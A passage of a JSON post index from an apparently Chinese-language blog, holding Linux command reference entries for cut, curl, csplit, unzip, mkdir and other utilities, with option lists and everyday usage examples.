68 98 使用-f选项提取指定字段（这里的 f 参数可以简单记忆为--fields的缩写）： [root@localhost text]# cut -f 1 test.txt No 01 02 03 [root@localhost text]# cut -f2,3 test.txt Name Mark tom 69 jack 71 alex 68 --complement选项提取指定字段之外的列（打印除了第二列之外的列）： [root@localhost text]# cut -f2 --complement test.txt No Mark Percent 01 69 91 02 71 87 03 68 98 使用 -d 选项指定字段分隔符： [root@localhost text]# cat test2.txt No;Name;Mark;Percent 01;tom;69;91 02;jack;71;87 03;alex;68;98 [root@localhost text]# cut -f2 -d&quot;;&quot; test2.txt Name tom jack alex 指定字段的字符或者字节范围 cut 命令可以将一串字符作为列来显示，字符字段的记法： N- ：从第 N 个字节、字符、字段到结尾； N-M ：从第 N 个字节、字符、字段到第 M 个（包括 M 在内）字节、字符、字段； -M ：从第 1 个字节、字符、字段到第 M 个（包括 M 在内）字节、字符、字段。 上面是记法，结合下面选项将摸个范围的字节、字符指定为字段： -b 表示字节； -c 表示字符； -f 表示定义字段。 示例 [root@localhost text]# cat test.txt abcdefghijklmnopqrstuvwxyz abcdefghijklmnopqrstuvwxyz abcdefghijklmnopqrstuvwxyz abcdefghijklmnopqrstuvwxyz abcdefghijklmnopqrstuvwxyz 打印第 1 个到第 3 个字符： [root@localhost text]# cut -c1-3 test.txt abc abc abc abc abc 打印前 2 个字符： [root@localhost text]# cut -c-2 test.txt ab ab ab ab ab 打印从第 5 个字符开始到结尾： [root@localhost text]# cut -c5- test.txt efghijklmnopqrstuvwxyz efghijklmnopqrstuvwxyz efghijklmnopqrstuvwxyz efghijklmnopqrstuvwxyz efghijklmnopqrstuvwxyz ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"cut","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/cut/","stats":{"text":"4 min read","time":203000,"words":830,"minutes":4},"date":"2022-02-01 07:02:39","dateFormat":"2022-02-01"},{"content":"利用 URL 规则在命令行下工作的文件传输工具。 补充说明 curl 命令是一个利用 URL 规则在命令行下工作的文件传输工具。它支持文件的上传和下载，所以是综合传输工具，但按传统，习惯称 curl 为下载工具。作为一款强力工具，curl 支持包括 HTTP、HTTPS、ftp 等众多协议，还支持 POST、cookies、认证、从指定偏移处下载部分文件、用户代理字符串、限速、文件大小、进度条等特征。做网页处理流程和数据检索自动化，curl 可以祝一臂之力。 语法 curl (选项) (参数) 选项 参数 说明 -a/--append 上传文件时，附加到目标文件 -A/--user-agent 设置用户代理发送给服务器 -anyauth 可以使用“任何”身份验证方法 -b/--cookie cookie字符串或文件读取位置 --basic 使用HTTP基本验证 -B/--use-ascii 使用ASCII /文本传输 -c/--cookie-jar 操作结束后把cookie写入到这个文件中 -C/--continue-at 断点续传 -d/--data HTTP POST方式传送数据 --data-ascii 以ascii的方式post数据 --data-binary 以二进制的方式post数据 --negotiate 使用HTTP身份验证 --digest 使用数字身份验证 --disable-eprt 禁止使用EPRT或LPRT --disable-epsv 禁止使用EPSV -D/--dump-header 把header信息写入到该文件中 --egd-file 为随机数据(SSL)设置EGD socket路径 --tcp-nodelay 使用TCP_NODELAY选项 -e/--referer 来源网址 -E/--cert 客户端证书文件和密码 (SSL) --cert-type 证书文件类型 (DER/PEM/ENG) (SSL) --key 私钥文件名 (SSL) --key-type 私钥文件类型 (DER/PEM/ENG) (SSL) --pass 私钥密码 (SSL) --engine 加密引擎使用 (SSL). &quot;--engine list&quot; for list --cacert CA证书 (SSL) --capath CA目录 (made using c_rehash) to verify peer against (SSL) --ciphers SSL密码 --compressed 要求返回是压缩的形势 (using deflate or gzip) --connect-timeout 设置最大请求时间 --create-dirs 建立本地目录的目录层次结构 --crlf 上传是把LF转变成CRLF -f/--fail 连接失败时不显示http错误 --ftp-create-dirs 如果远程目录不存在，创建远程目录 --ftp-method [multicwd/nocwd/singlecwd] 控制CWD的使用 --ftp-pasv 使用 PASV/EPSV 代替端口 --ftp-skip-pasv-ip 使用PASV的时候,忽略该IP地址 --ftp-ssl 尝试用 SSL/TLS 来进行ftp数据传输 --ftp-ssl-reqd 要求用 SSL/TLS 来进行ftp数据传输 -F/--form 模拟http表单提交数据 --form-string 模拟http表单提交数据 -g/--globoff 禁用网址序列和范围使用{}和[] -G/--get 以get的方式来发送数据 -H/--header 自定义头信息传递给服务器 --ignore-content-length 忽略的HTTP头信息的长度 -i/--include 输出时包括protocol头信息 -I/--head 只显示请求头信息 -j/--junk-session-cookies 读取文件进忽略session cookie --interface 使用指定网络接口/地址 --krb4 使用指定安全级别的krb4 -k/--insecure 允许不使用证书到SSL站点 -K/--config 指定的配置文件读取 -l/--list-only 列出ftp目录下的文件名称 --limit-rate 设置传输速度 --local-port 强制使用本地端口号 -m/--max-time 设置最大传输时间 --max-redirs 设置最大读取的目录数 --max-filesize 设置最大下载的文件总量 -M/--manual 显示全手动 -n/--netrc 从netrc文件中读取用户名和密码 --netrc-optional 使用 .netrc 或者 URL来覆盖-n --ntlm 使用 HTTP NTLM 身份验证 -N/--no-buffer 禁用缓冲输出 -o/--output 把输出写到该文件中 -O/--remote-name 把输出写到该文件中，保留远程文件的文件名 -p/--proxytunnel 使用HTTP代理 --proxy-anyauth 选择任一代理身份验证方法 --proxy-basic 在代理上使用基本身份验证 --proxy-digest 在代理上使用数字身份验证 --proxy-ntlm 在代理上使用ntlm身份验证 -P/--ftp-port 使用端口地址，而不是使用PASV -q 作为第一个参数，关闭 .curlrc -Q/--quote 文件传输前，发送命令到服务器 -r/--range 检索来自HTTP/1.1或FTP服务器字节范围 --range-file 读取（SSL）的随机文件 -R/--remote-time 在本地生成文件时，保留远程文件时间 --retry 传输出现问题时，重试的次数 --retry-delay 传输出现问题时，设置重试间隔时间 --retry-max-time 传输出现问题时，设置最大重试时间 -s/--silent 静默模式。不输出任何东西 -S/--show-error 显示错误 --socks4 用socks4代理给定主机和端口 --socks5 用socks5代理给定主机和端口 --stderr -t/--telnet-option Telnet选项设置 --trace 对指定文件进行debug --trace-ascii Like --跟踪但没有hex输出 --trace-time 跟踪/详细输出时，添加时间戳 -T/--upload-file 上传文件 --url Spet URL to work with -u/--user 设置服务器的用户和密码 -U/--proxy-user 设置代理用户名和密码 -w/--write-out [format] 什么输出完成后 -x/--proxy 在给定的端口上使用HTTP代理 -X/--request 指定什么命令 -y/--speed-time 放弃限速所要的时间，默认为30 -Y/--speed-limit 停止传输速度的限制，速度时间 实例 文件下载 curl 命令可以用来执行下载、发送各种 HTTP 请求，指定 HTTP 头部等操作。如果系统没有 curl 可以使用yum install curl安装，也可以下载安装。curl 是将下载文件输出到 stdout，将进度信息输出到stderr，不显示进度信息使用--silent选项。 curl URL --silent 这条命令是将下载文件输出到终端，所有下载的数据都被写入到 stdout。 使用选项-O将下载的数据写入到文件，必须使用文件的绝对地址： curl http://example.com/text.iso --silent -O 选项-o将下载数据写入到指定名称的文件中，并使用--progress显示进度条： curl http://example.com/test.iso -o filename.iso --progress ######################################### 100.0% 不输出错误和进度信息 -s参数将不输出错误和进度信息。 curl -s https://www.example.com # 上面命令一旦发生错误，不会显示错误信息。不发生错误的话，会正常显示运行结果。 如果想让 curl 不产生任何输出，可以使用下面的命令。 curl -s -o /dev/null https://google.com 断点续传 curl 能够从特定的文件偏移处继续下载，它可以通过指定一个便宜量来下载部分文件： curl URL/File -C 偏移量 #偏移量是以字节为单位的整数，如果让curl自动推断出正确的续传位置使用-C -： curl -C -URL 使用 curl 设置参照页字符串 参照页是位于 HTTP 头部中的一个字符串，用来表示用户是从哪个页面到达当前页面的，如果用户点击网页 A中的某个连接，那么用户就会跳转到B网页，网页B头部的参照页字符串就包含网页 A 的 URL。 使用--referer选项指定参照页字符串： curl --referer http://www.google.com http://example.com 用curl设置用户代理字符串 有些网站访问会提示只能使用IE浏览器来访问，这是因为这些网站设置了检查用户代理，可以使用 curl 把用户代理设置为 IE，这样就可以访问了。使用--user-agent或者-A选项： curl URL --user-agent &quot;Mozilla/5.0&quot; curl URL -A &quot;Mozilla/5.0&quot; 其他 HTTP 头部信息也可以使用 curl 来发送，使用-H&quot;头部信息&quot; 传递多个头部信息，例如： curl -H &quot;Host:example.com&quot; -H &quot;accept-language:zh-cn&quot; URL curl 的带宽控制和下载配额 使用--limit-rate限制 curl 的下载速度： curl URL --limit-rate 50k 命令中用 k（千字节）和 m（兆字节）指定下载速度限制。 使用--max-filesize指定可下载的最大文件大小： curl URL --max-filesize bytes 如果文件大小超出限制，命令则返回一个非 0 退出码，如果命令正常则返回 0。 curl --limit-rate 200k https://example.com # 上面命令将带宽限制在每秒 200K 字节。 用 curl 进行认证 使用 curl 选项 -u 可以完成 HTTP 或者 FTP 的认证，可以指定密码，也可以不指定密码在后续操作中输入密码： curl -u user:pwd http://example.com curl -u user http://example.com 只打印响应头部信息 通过 -I 或者 -head 可以只打印出 HTTP 头部信息： [root@localhost text]# curl -I http://example.com HTTP/1.1 200 OK Server: nginx/1.2.5 date: Mon, 10 Dec 2012 09:24:34 GMT Content-Type: text/html; charset=UTF-8 Connection: keep-alive Vary: Accept-Encoding X-Pingback: http://example.com/xmlrpc.php get 请求 curl &quot;http://www.example.com&quot; # 如果这里的URL指向的是一个文件或者一幅图都可以直接下载到本地 curl -i &quot;http://www.example.com&quot; # 显示全部信息 curl -l &quot;http://www.example.com&quot; # 只显示头部信息 curl -v &quot;http://www.example.com&quot; # 显示get请求全过程解析 post 请求 $ curl -d &quot;param1=value1&amp;param2=value2&quot; &quot;http://www.example.com/login&quot; curl -d'login=emma＆password=123' -X POST https://example.com/login # 或者 $ curl -d 'login=emma' -d 'password=123' -X POST https://example.com/login --data-urlencode参数等同于-d，发送POST请求的数据体，区别在于会自动将发送的数据进行 URL 编码。 curl --data-urlencode 'comment=hello world' https://example.com/login # 上面代码中，发送的数据hello world之间有一个空格，需要进行 URL 编码。 读取本地文本文件的数据，向服务器发送 curl -d '@data.txt' https://example.com/upload # 读取data.txt文件的内容，作为数据体向服务器发送。 json 格式的 post 请求 curl -l -H &quot;Content-type: application/json&quot; -X POST -d '{&quot;phone&quot;:&quot;13521389587&quot;,&quot;password&quot;:&quot;test&quot;}' http://example.com/apis/users.json 向服务器发送 Cookie 使用--cookie &quot;COKKIES&quot;选项来指定 cookie，多个 cookie 使用分号分隔： curl http://example.com --cookie &quot;user=root;pass=123456&quot; 将 cookie 另存为一个文件，使用--cookie-jar选项： curl URL --cookie-jar cookie_file -b参数用来向服务器发送 Cookie。 curl -b 'foo=bar' https://example.com # 上面命令会生成一个标头Cookie: foo=bar，向服务器发送一个名为foo、值为bar的 Cookie。 curl -b 'foo1=bar' -b 'foo2=baz' https://example.com # 上面命令发送两个 Cookie。 ```shell curl -b cookies.txt https://www.example.com # 上面命令读取本地文件 cookies.txt，里面是服务器设置的 Cookie（参见-c参数），将其发送到服务器。 Cookie 写入一个文件 curl -c cookies.txt https://www.example.com # 上面命令将服务器的 HTTP 回应所设置 Cookie 写入文本文件cookies.txt。 请求的来源 -e参数用来设置HTTP的标头`Referer，表示请求的来源。 curl -e 'https://example.com?q=example' https://www.example.com # 上面命令将Referer标头设为 https://example.com?q=example。 -H参数可以通过直接添加标头Referer，达到同样效果。 curl -H 'Referer: https://example.com?q=example' https://www.example.com 上传二进制文件 -F参数用来向服务器上传二进制文件。 curl -F 'file=@photo.png' https://example.com/profile # 上面命令会给 HTTP 请求加上标头 Content-Type: multipart/form-data ，然后将文件photo.png作为file字段上传。 -F参数可以指定MIME类型。 curl -F 'file=@photo.png;type=image/png' https://example.com/profile # 上面命令指定 MIME 类型为image/png，否则 curl 会把 MIME 类型设为 application/octet-stream。 -F参数也可以指定文件名。 curl -F 'file=@photo.png;filename=me.png' https://example.com/profile # 上面命令中，原始文件名为photo.png，但是服务器接收到的文件名为me.png。 设置请求头 -H参数添加HTTP请求的标头。 curl -H 'Accept-Language: en-US' https://google.com # 上面命令添加 HTTP 标头 Accept-Language: en-US。 curl -H 'Accept-Language: en-US' -H 'Secret-Message: xyzzy' https://google.com # 上面命令添加两个 HTTP 标头。 curl -d '{&quot;login&quot;: &quot;emma&quot;, &quot;pass&quot;: &quot;123&quot;}' -H 'Content-Type: application/json' https://google.com/login # 上面命令添加 HTTP 请求的标头是 Content-Type: application/json，然后用 -d 参数发送 JSON 数据。 跳过 SSL 检测 curl -k https://www.example.com # 上面命令不会检查服务器的 SSL 证书是否正确。 请求跟随服务器的重定向 -L参数会让HTTP请求跟随服务器的重定向。curl默认不跟随重定向。 curl -L -d 'tweet=hi' https://api.example.com/tweet 调试参数 -v参数输出通信的整个过程，用于调试。 curl -v https://www.example.com # --trace参数也可以用于调试，还会输出原始的二进制数据。 $ curl --trace - https://www.example.com 获取本机外网ip curl ipecho.net/plain ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"curl","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/curl/","stats":{"text":"14 min read","time":799000,"words":3181,"minutes":14},"date":"2022-02-01 06:37:53","dateFormat":"2022-02-01"},{"content":"启动指定的打印机。 补充说明 cupsenable 命令用于启动指定的打印机。 语法 cupsenable (选项) (参数) 选项 -E：当连接到服务器时强制使用加密； -U：指定连接服务器时使用的用户名； -u：指定打印任务所属的用户； -h：指定连接的服务器名和端口号； 参数 目标：指定目标打印机。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"cupsenable","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/cupsenable/","stats":{"text":"1 min read","time":21000,"words":101,"minutes":1},"date":"2022-02-01 06:34:33","dateFormat":"2022-02-01"},{"content":"停止指定的打印机。 补充说明 cupsdisable 命令用于停止指定的打印机。 语法 cupsdisable (选项) (参数) 选项 -E：当连接到服务器时强制使用加密； -U：指定连接服务器时使用的用户名； -u：指定打印任务所属的用户； -c：取消指定打印机的所有打印任务； -h：指定连接的服务器名和端口号； -r：停止打印机的原因。 参数 目标：指定目标打印机。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"cupsdisable","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/cupsdisable/","stats":{"text":"1 min read","time":26000,"words":125,"minutes":1},"date":"2022-02-01 06:30:16","dateFormat":"2022-02-01"},{"content":"用于连接另一个系统主机。 补充说明 cu 命令用于连接另一个系统主机。cu(call up) 指令可连接另一台主机，并采用类似拨号终端机的接口工作，也可执行简易的文件传输作业。 语法 cu [dehnotv][-a&lt;通信端口&gt;][-c&lt;电话号码&gt;][-E&lt;脱离字符&gt;][-I&lt;设置文件&gt;][-l&lt;外围设备代号&gt;] [-s&lt;连线速率&gt;][-x&lt;排错模式&gt;][-z&lt;系统主机&gt;][--help][-nostop][--parity=none][&lt;系统主机&gt;/&lt;电话号码&gt;] 选项 -a&lt;通信端口&gt;或-p&lt;通信端口&gt;或--port&lt;通信端口&gt; 使用指定的通信端口进行连线。 -c&lt;电话号码&gt;或--phone&lt;电话号码&gt; 拨打该电话号码。 -d 进入排错模式。 -e或--parity=even 使用双同位检查。 -E&lt;脱离字符&gt;或--escape&lt;脱离字符&gt; 设置脱离字符。 -h或--halfduple 使用半双工模式。 -I&lt;配置文件&gt;或--config&lt;配置文件&gt; 指定要使用的配置文件。 -l&lt;外围设备代号&gt;或--line&lt;外围设备代号&gt; 指定某项外围设备，作为连接的设备。 -n或--prompt 拨号时等待用户输入电话号码。 -o或--parity=odd 使用单同位检查。 -s&lt;连线速率&gt;或--speed&lt;连线速率&gt;或--baud&lt;连线速率&gt;或-&lt;连线速率&gt; 设置连线的速率，单位以鲍率计算。 -t或--maper 把CR字符置换成LF+CR字符。 -v或--version 显示版本信息。 -x&lt;排错模式&gt;或--debug&lt;排错模式&gt; 使用排错模式。 -z&lt;系统主机&gt;或--system&lt;系统主机&gt; 连接该系统主机。 --help 在线帮助。 --nostop 关闭Xon/Xoff软件流量控制。 --parity=none 不使用同位检查。 实例 与远程主机连接 cu -c 0102377765 cu -s 38400 9=12015551234 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"cu","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/cu/","stats":{"text":"3 min read","time":120000,"words":494,"minutes":3},"date":"2022-02-01 06:28:04","dateFormat":"2022-02-01"},{"content":"将一个大文件分割成小的碎片文件。 补充说明 csplit 命令用于将一个大文件分割成小的碎片，并且将分割后的每个碎片保存成一个文件。碎片文件的命名类似“xx00”，“xx01”。csplit 命令是 split 的一个变体，split 只能够根据文件大小或行数来分割，但csplit 能够根据文件本身特点来分割文件。 语法 csplit (选项) (参数) 选项 -b&lt;输出格式&gt;或--suffix-format=&lt;输出格式&gt;：预设的输出格式其文件名称为xx00，xx01等，用户可以通过改变&lt;输出格式&gt;来改变输出的文件名； -f&lt;输出字首字符串&gt;或--prefix=&lt;输出字首字符串&gt;：预设的输出字首字符串其文件名为xx00，xx01等，如果制定输出字首字符串为“hello”，则输出的文件名称会变成hello00，hello、01...... -k或--keep-files：保留文件，就算发生错误或中断执行，与不能删除已经输出保存的文件； -n&lt;输出文件名位数&gt;或--digits=&lt;输出文件名位数&gt;：预设的输出文件名位数其文件名称为xx00，xx01......如果用户指定输出文件名位数为“3”，则输出的文件名称会变成xx000，xx001等； -q或-s或--quiet或——silent：不显示指令执行过程； -z或--elide-empty-files：删除长度为0 Byte文件。 参数 文件：指定要分割的原文件； 模式：指定要分割文件时的匹配模式。 实例 示例测试文件 server.log cat server.log SERVER-1 [con] 10.10.10.1 suc [con] 10.10.10.2 fai [dis] 10.10.10.3 pen [con] 10.10.10.4 suc SERVER-2 [con] 10.10.10.5 suc [con] 10.10.10.6 fai [dis] 10.10.10.7 pen [con] 10.10.10.8 suc SERVER-3 [con] 10.10.10.9 suc [con] 10.10.10.10 fai [dis] 10.10.10.11 pen [con] 10.10.10.12 suc 需要将 server.log 分割成 server1.log、server2.log、server3.log 这些文件的内容分别取自原文件中不同的 SERVER 部分： [root@localhost split]# csplit server.log /SERVER/ -n2 -s {*} -f server -b &quot;%02d.log&quot;; rm server00.log [root@localhost split]# ls server01.log server02.log server03.log server.log 命令详细说明： /[正则表达式]/ #匹配文本样式，比如/SERVER/，从第一行到包含SERVER的匹配行。 {*} #表示根据匹配重复执行分割，直到文件尾停止，使用{整数}的形式指定分割执行的次数。 -s #静默模式，不打印其他信息。 -n #指定分割后的文件名后缀的数字个数。比如01、02、03等。 -f #指定分割后的文件名前缀。 -b #指定后缀格式。比如%02d.log，类似于C语言中的printf参数格式。 rm server00.log #是删除第一个文件，因为分割后的的第一个文件没有内容，匹配的单词就位于文件的第一行中。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"csplit","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/csplit/","stats":{"text":"4 min read","time":180000,"words":734,"minutes":4},"date":"2022-02-01 06:24:17","dateFormat":"2022-02-01"},{"content":"从当前终端登录到远程 Linux 主机。 补充说明 rlogin 命令用于从当前终端登录到远程 Linux 主机。 语法 rlogin (选项) (参数) 选项 -8：允许输入 8 位字符数据； -e 脱离字符&amp;gt;：设置脱离字符； -E：滤除脱离字符； -l 用户名称&gt;：指定要登入远端主机的用户名称； -L：使用 litout 模式进行远端登入阶段操作。 参数 远程主机：指定要登录的远程主机（ip 地址或者域名）。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"rlogin","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/rlogin/","stats":{"text":"1 min read","time":29000,"words":134,"minutes":1},"date":"2022-02-01 05:06:10","dateFormat":"2022-02-01"},{"content":"计算文件的校验码和显示块数。 补充说明 sum 命令用于计算并显示指定文件的校验和与文件所占用的磁盘块数。 语法 sum (选项) (参数) 选项 -r：使用 BSD 的校验和算法，块大小为 1k； -s：使用 system V 的校验和算法，块大小为 512 字节。 参数 文件列表：需要计算和与磁盘块数的文件列表。 实例 计算文件校验码： [root@localhost ~]# sum insert.sql 00827 12 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"sum","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/sum/","stats":{"text":"1 min read","time":27000,"words":125,"minutes":1},"date":"2022-02-01 05:03:04","dateFormat":"2022-02-01"},{"content":"显示二进制目标文件的符号表。 补充说明 nm 命令被用于显示二进制目标文件的符号表。 语法 nm (选项) (参数) 选项 -A：每个符号前显示文件名； -D：显示动态符号； -g：仅显示外部符号； -r：反序显示符号表。 参数 目标文件：二进制目标文件，通常是库文件和可执行文件。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"nm","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/nm/","stats":{"text":"1 min read","time":21000,"words":104,"minutes":1},"date":"2022-02-01 03:25:34","dateFormat":"2022-02-01"},{"content":"用于解压缩由 zip 命令压缩的压缩包。 补充说明 unzip 命令用于解压缩由 zip 命令压缩的“.zip”压缩包。 语法 unzip (选项) (参数) 选项 -c：将解压缩的结果显示到屏幕上，并对字符做适当的转换； -f：更新现有的文件； -l：显示压缩文件内所包含的文件； -p：与-c 参数类似，会将解压缩的结果显示到屏幕上，但不会执行任何的转换； -t：检查压缩文件是否正确； -u：与-f 参数类似，但是除了更新现有的文件外，也会将压缩文件中的其他文件解压缩到目录中； -v：执行时显示详细的信息； -z：仅显示压缩文件的备注文字； -a：对文本文件进行必要的字符转换； -b：不要对文本文件进行字符转换； -C：压缩文件中的文件名称区分大小写； -j：不处理压缩文件中原有的目录路径； -L：将压缩文件中的全部文件名改为小写； -M：将输出结果送到 more 程序处理； -n：解压缩时不要覆盖原有的文件； -o：不必先询问用户，unzip 执行后覆盖原有的文件； -P&lt;密码&gt;：使用 zip 的密码选项； -q：执行时不显示任何信息； -s：将文件名中的空白字符转换为底线字符； -V：保留 VMS 的文件版本信息； -X：解压缩时同时回存文件原来的 UID/GID； -d&lt;目录&gt;：指定文件解压缩后所要存储的目录； -x&lt;文件&gt;：指定不要处理.zip 压缩文件中的哪些文件； -Z：unzip-Z 等于执行 zipinfo 指令。 参数 压缩包：指定要解压的“.zip”压缩包。 实例 将压缩文件 text.zip 在当前目录下解压缩。 unzip test.zip 将压缩文件 text.zip 在指定目录/tmp下解压缩，如果已有相同的文件存在，要求 unzip 命令不覆盖原先的文件。 unzip -n test.zip -d /tmp 查看压缩文件目录，但不解压。 unzip -v test.zip 将压缩文件 test.zip 在指定目录/tmp下解压缩，如果已有相同的文件存在，要求 unzip 命令覆盖原先的文件。 unzip -o test.zip -d tmp/ ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"unzip","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/unzip/","stats":{"text":"3 min read","time":131000,"words":588,"minutes":3},"date":"2022-02-01 03:19:35","dateFormat":"2022-02-01"},{"content":"查询一个命令执行什么功能。 补充说明 whatis 命令是用于查询一个命令执行什么功能，并将查询结果打印到终端上。 whatis 命令在用catman -w命令创建的数据库中查找 command 参数指定的命令、系统调用、库函数或特殊文件名。whatis 命令显示手册部分的页眉行。然后可以发出 man 命令以获取附加的信息。whatis 命令等同于使用man -f命令。 语法 whatis 实例 [root@localhost ~]# whatis ls ls (1) - list directory contents ls (1p) - list directory contents [root@localhost ~]# whatis cp cp (1) - copy files and directories cp (1p) - copy files [root@localhost ~]# whatis chown chown (1) - change file owner and group chown (1p) - change the file ownership chown (2) - change ownership of a file chown (3p) - change owner and group of a file [root@localhost ~]# whatis man man (1) - format and display the on-line manual pages man (1p) - display system documentation man (7) - macros to format man pages man (rpm) - A set of documentation tools: man, apropos and whatis. man-pages (rpm) - Man (manual) pages from the Linux Documentation Project. man.config [man] (5) - configuration data for man ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"whatis","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/whatis/","stats":{"text":"2 min read","time":72000,"words":249,"minutes":2},"date":"2022-02-01 03:19:10","dateFormat":"2022-02-01"},{"content":"PHP 语言的命令行接口。 补充说明 php 命令是流行的 Web 开发语言 PHP 的命令行接口，可以使用 PHP 语言开发基于命令行的系统管理脚本程序。 语法 php (选项) (参数) 选项 -a：进入交互模式； -c：指定“php.ini”的搜索路径。 参数 文件：要执行的 php 脚本。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"php","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/php/","stats":{"text":"1 min read","time":20000,"words":92,"minutes":1},"date":"2022-02-01 03:14:32","dateFormat":"2022-02-01"},{"content":"强制为 gzip 格式的压缩文件添加 .gz 后缀。 补充说明 zfore 命令强制为 gzip 格式的压缩文件添加“.gz”后缀。 语法 zfore (参数) 参数 文件列表：指定要添加“.gz”后缀的 gzip 压缩文件。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"zfore","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/zfore/","stats":{"text":"1 min read","time":14000,"words":64,"minutes":1},"date":"2022-02-01 03:11:43","dateFormat":"2022-02-01"},{"content":"显示和设置系统的 NIS 域名。 补充说明 domainname 命令用于显示和设置系统的 NIS 域名。 语法 domainname (选项) (参数) 选项 -v：详细信息模式； -F：指定读取域名信息的文件。 参数 NIS 域名：指定要设置的 NIS 域名。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"domainname","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/domainname/","stats":{"text":"1 min read","time":16000,"words":73,"minutes":1},"date":"2022-02-01 03:07:35","dateFormat":"2022-02-01"},{"content":"用来创建目录。 补充说明 mkdir 命令用来创建目录。该命令创建由 dirname 命名的目录。如果在目录名的前面没有加任何路径名，则在当前目录下创建由 dirname 指定的目录； 如果给出了一个已经存在的路径，将会在该目录下创建一个指定的目录。在创建目录时，应保证新建的目录与它所在目录下的文件没有重名。 注意：在创建文件时，不要把所有的文件都存放在主目录中，可以创建子目录，通过它们来更有效地组织文件。最好采用前后一致的命名方式来区分文件和目录。例如，目录名可以以大写字母开头，这样，在目录列表中目录名就出现在前面。 在一个子目录中应包含类型相似或用途相近的文件。例如，应建立一个子目录，它包含所有的数据库文件，另有一个子目录应包含电子表格文件，还有一个子目录应包含文字处理文档，等等。目录也是文件，它们和普通文件一样遵循相同的命名规则，并且利用全路径可以唯一地指定一个目录。 语法 mkdir (选项) (参数) 选项 -Z：设置安全上下文，当使用 SELinux 时有效； -m&lt;目标属性&gt;或--mode&lt;目标属性&gt;建立目录的同时设置目录的权限； -p 或--parents 若所要建立目录的上层目录目前尚未建立，则会一并建立上层目录； --version 显示版本信息。 参数 目录：指定要创建的目录列表，多个目录之间用空格隔开。 实例 在目录/usr/meng下建立子目录 test，并且只有文件主有读、写和执行权限，其他人无权访问 mkdir -m 700 /usr/meng/test 在当前目录中建立 bin 和 bin 下的 os_1 目录，权限设置为文件主可读、写、执行，同组用户可读和执行，其他用户无权访问 mkdir -p-m 750 bin/os_1 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"mkdir","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/mkdir/","stats":{"text":"2 min read","time":115000,"words":547,"minutes":2},"date":"2022-02-01 03:01:56","dateFormat":"2022-02-01"},{"content":"初始化和重建 RPM 数据库。 补充说明 rpmdb 命令用于初始化和重建 rpm 数据库。 语法 rpmdb (选项) 选项 --initdb：初始化RPM数据库； --rebuilddb：从已安装的包头文件，反向重建RPM数据库。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"rpmdb","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/rpmdb/","stats":{"text":"1 min read","time":13000,"words":62,"minutes":1},"date":"2022-02-01 02:41:51","dateFormat":"2022-02-01"},{"content":"退出当前登录的 Shell。 补充说明 logout 命令用于退出当前登录的 Shell，logout 指令让用户退出系统，其功能和 login 指令相互对应。 语法 &lt;span&gt;logout&lt;/span&gt; ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"logout","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/logout/","stats":{"text":"1 min read","time":13000,"words":55,"minutes":1},"date":"2022-02-01 02:38:44","dateFormat":"2022-02-01"},{"content":"对文件进行拼写检查。 补充说明 spell 命令对文件进行拼写检查，并把拼写错误的单词输出。 语法 spell (参数) 参数 文件：指定需要进行拼写检查的文件。 